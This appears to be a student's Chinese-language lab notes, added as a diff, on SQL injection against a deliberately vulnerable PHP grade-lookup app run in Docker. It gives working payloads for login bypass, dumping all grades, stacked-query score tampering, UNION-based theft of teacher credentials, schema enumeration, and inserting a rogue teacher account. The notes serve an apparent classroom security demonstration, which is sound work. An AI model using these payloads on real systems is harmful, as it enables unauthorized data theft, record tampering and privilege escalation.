@@ -1,0 +1,193 @@
+
+漏洞1.查詢他人成績，在不知道密碼的情況下(舉例查學生2)
+
+    💡原理:透過單引號 ' 提早結束帳號字串，並用 # 註解掉後方的密碼檢查，使資料庫僅驗證學號即回傳資料。
+
+    1️⃣注入前: 
+    $sql = "SELECT * FROM userTable 
+    JOIN scoreTable ON userTable.username = scoreTable.studentId 
+    WHERE userTable.username = '$id' AND userTable.password = '$pass'";
+    
+    2️⃣攻擊語句:S002' #
+
+    3️⃣注入後:
+    SELECT * FROM userTable
+    JOIN scoreTable ON userTable.username = scoreTable.studentId
+    WHERE userTable.username = 'S002' # ' AND userTable.password = '任意文字' 
+
+    4️⃣結果:導出學生2的成績
+
+漏洞2.查詢全班成績
+
+    💡原理:利用 OR 1=1 創造一個永遠成立的條件，讓資料庫判定每一行資料都符合篩選要求，配合 # 註解密碼後可一次抓出所有人的成績。
+
+    1️⃣注入前： 
+    $sql = "SELECT * FROM userTable 
+    JOIN scoreTable ON userTable.username = scoreTable.studentId
+    WHERE userTable.username = '$id' AND userTable.password = '$pass'";
+
+    2️⃣攻擊語句：' OR 1=1 #
+
+    3️⃣注入後：
+    SELECT * FROM userTable
+    JOIN scoreTable ON userTable.username = scoreTable.studentId 
+    WHERE userTable.username = '' OR 1=1 # ' AND userTable.password = '任意文字'
+
+    4️⃣結果:查出全班成績
+
+漏洞3.竄改他人成績(堆疊查詢)
+
+    💡原理： 使用分號 ; 結束第一條查詢指令，隨後緊接一條全新的 UPDATE 修改指令。此漏洞必須在 PHP 程式碼使用 multi_query() 函式時才會生效。
+
+    1️⃣注入前： 
+    $sql = "SELECT * FROM userTable 
+    JOIN scoreTable ON userTable.username = scoreTable.studentId
+    WHERE userTable.username = '$id' AND userTable.password = '$pass'";
+
+    2️⃣攻擊語句： S001'; UPDATE scoreTable SET score = 100 WHERE studentId = 'S001' #
+
+    3️⃣注入後： 
+    SELECT * FROM userTable
+    JOIN scoreTable ON ... WHERE userTable.username = 'S001'; UPDATE scoreTable SET score = 100 WHERE
+    studentId = 'S001'; # ' AND userTable.password = '任意文字'
+
+    4️⃣結果:竄改學生1的成績為100
+
+漏洞4.取得老師帳號密碼
+
+    💡原理:利用 UNION SELECT 合併另一場自定義的查詢。透過佔位符 1, 2, 3 填充不顯示的欄位，將真正的老師帳密（username, password）塞入網頁會顯示的「學號」與「姓名」格子中。
+    
+    1️⃣注入前: 
+    $sql = "SELECT * FROM userTable  
+    JOIN scoreTable ON userTable.username = scoreTable.studentId  
+    WHERE userTable.username = '$id' AND userTable.password = '$pass'";
+
+    2️⃣攻擊語句:' UNION SELECT 1, 2, 3, username, password, 999 FROM userTable WHERE role='teacher' #
+
+    3️⃣注入後: 
+    SELECT * FROM userTable 
+    JOIN scoreTable ON userTable.username = scoreTable.studentId 
+    WHERE userTable.username = '' UNION SELECT 1, 2, 3, username, password, 999 
+    FROM userTable WHERE role='teacher' # ' AND userTable.password = ''
+    
+        --指令拆解--
+        '                       閉合語句:結束原本的 username 字串，讓後面的指令生效
+        UNION SELECT            聯合查詢:把自己寫的查詢結果，接到原本查詢後面顯示 (原本前面''查到的是空的資料，我再塞一筆我想要的資料進結果)
+        1, 2, 3	                填補隱藏欄位：對應 userTable 的前 3 個欄位（username, password, role）。因 PHP 不會印出這三格，所以隨便填數字佔位
+        username	            偷取帳號：放在第 4 格，對應網頁的「學號」位置，讓老師帳號顯示出來
+        password	            偷取密碼：放在第 5 格，對應網頁的「姓名」位置，讓老師密碼顯示出來
+        999	                    偽造數據：放在第 6 格，對應網頁的「成績」位置，填入無意義的分數
+        FROM userTable	        指定來源：要求從帳密表 (userTable) 抓取資料
+        WHERE role='teacher'	過濾條件：只抓取身份為老師的資料列
+        #                       注解後段：將後方原本的密碼驗證語法變成註解，繞過身分檢查
+
+
+    4️⃣結果:取得老師帳號密碼
+
+    +----------+----------+----------+
+    | username | password | role     |
+    +----------+----------+----------+
+    | S000     | admin123 | teacher  |
+    | S001     | p001     | student  |
+    | S002     | p002     | student  |
+    | S003     | p003     | student  |
+    | ...      | ...      | ...      |
+    +----------+----------+----------+
+
+    +-----------+---------+-------+
+    | studentId | name    | score |
+    +-----------+---------+-------+
+    | S000      | Alex    | 85    |
+    | S001      | Brian  | 60    |
+    | S002      | Cathy  | 92    |
+    | S003      | Daniel | 78    |
+    | ...       | ...     | ...   |
+    +-----------+---------+-------+
+
+    +----------+----------+----------+-----------+---------+-------+
+    | username | password | role     | studentId | name    | score |
+    +----------+----------+----------+-----------+---------+-------+
+    | S001     | p001     | student  | S001      | Brian  | 60    |
+    +----------+----------+----------+-----------+---------+-------+
+
+漏洞5:新增老師權限的帳號
+
+    竄改成績的語法是: S001'; UPDATE scoreTable SET score = 100 WHERE studentId = 'S001' #
+    取得老師帳號密碼的語法是:' UNION SELECT 1, 2, 3, username, password, 999 FROM userTable WHERE role='teacher' #
+
+    在執行上述語法前，都需要知道「資料表」還有「欄位」的名稱才寫得出來
+    
+        查資料表名稱:
+        ' UNION SELECT 1,2,3,table_name,5,6    
+        FROM INFORMATION_SCHEMA.TABLES         
+        WHERE table_schema = DATABASE() #      
+
+        查欄位名稱:
+        ' UNION SELECT 1,2,3,column_name,5,6   
+        FROM INFORMATION_SCHEMA.COLUMNS        
+        WHERE table_name = 'userTable' #      
+    
+    由上面兩個語法可以發現，在查「資料表名稱」和「欄位名稱」之前，又需要先知道資料表有幾個欄位、以及有哪些欄位的排序
+
+    所以整體的步驟是:   
+    要先知道資料庫有幾個欄位->哪些欄位會顯示在畫面上->導出資料表與欄位的名稱->新增老師權限的帳號
+
+
+    【第一步】確認欄位數量（利用「超出範圍」報錯）
+
+        📌目的: 確認原始 SELECT 有幾個欄位
+
+        注入語句(逐行測試):
+       ' ORDER BY 1 #        -- 測試是否至少有 1 個欄位
+       ' ORDER BY 2 #        -- 測試是否至少有 2 個欄位
+	    ...
+       ' ORDER BY N #        -- 持續測試至報錯，藉此找出原始查詢的總欄位數 (N)
+
+
+    【第二步】確認哪些欄位會顯示在畫面上
+
+        📌目的: 找出 UNION SELECT 中「可輸出的欄位位置」
+
+        注入語句:
+        ' UNION SELECT 1,2,3,4,5,6 #
+
+    【第三步】取得資料表與欄位名稱（翻資料庫目錄）
+
+        📌目的: 找出實際存在的表與欄位，才能寫出正確攻擊語句
+
+        先查資料表名稱:
+        ' UNION SELECT 1,2,3,table_name,5,6    -- 結束原字串並聯集查詢，將「表名」放入第 4 個顯示窗口
+        FROM INFORMATION_SCHEMA.TABLES         -- 從 MySQL 內建的「全資料表目錄」中進行檢索
+        WHERE table_schema = DATABASE() #      -- 僅過濾當前資料庫 (class_db) 
+
+        得到表名後再查欄位名稱:
+        ' UNION SELECT 1,2,3,column_name,5,6   -- 將「欄位名」放入第 4 個顯示窗口
+        FROM INFORMATION_SCHEMA.COLUMNS        -- 從 MySQL 內建的「全欄位目錄」中進行檢索
+        WHERE table_name = 'userTable' #       -- 過濾出目標表格 'userTable' 
+
+    [第四步-A] 新增老師權限的帳號
+   
+       📌目的:在資料表中插入一筆擁有老師權限的帳號
+
+      現在知道資料表名稱、欄位名稱、欄位數量和結構後，就能完成下方語句了
+      注入語句： S001'; INSERT INTO userTable (username, password, role) VALUES ('hacker', '123', 'teacher'); #
+
+    [第四步-B] 
+    攻擊語句： S001'; UPDATE scoreTable SET score = 100 WHERE studentId = 'S001' #
+
+
+
+
+
+
+
+接下來可做的方向...
+    1.製作安全版本當對照組(報告時安全版/漏洞版兩個比對)
+    2.老師端?:再做一個「老師端」的管理介面:可直接查看全班成績，每一列後面有個「修改」按鈕，可以更新成績 
+    3.介面優化，讓畫面更像成績查詢頁面 (登入後隱藏帳號密碼輸入欄位、返回鍵等)
+
+=== docker 相關指令 ===
+    docker compose up -d --build
+    docker compose down -v
+    docker compose exec db mysql -u root -proot class_db -e "SELECT * FROM ScoreTable;" //查看資料庫內部
+
